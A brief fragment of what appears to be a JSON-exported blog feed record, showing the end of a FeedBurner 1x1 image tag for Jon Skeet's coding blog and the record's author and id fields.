src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/vNRSrTLc02k\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1288}}
